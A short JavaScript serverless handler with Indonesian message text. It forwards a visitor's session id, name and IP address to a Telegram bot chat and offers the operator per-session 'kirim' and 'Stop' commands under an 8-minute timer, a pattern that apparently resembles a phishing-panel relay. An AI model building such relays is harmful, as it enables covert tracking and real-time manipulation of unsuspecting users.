export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();
  const { session, nama, ip } = req.body;
  
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;
  const text = `Ada pengguna masuk kembali\nNama: ${nama}\nIP: ${ip}\n(Timer 8 Menit dimulai)\n\nBalas dengan perintah:\nkirim ${session}\nStop ${session}`;

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
  });

  res.status(200).json({ success: true });
}
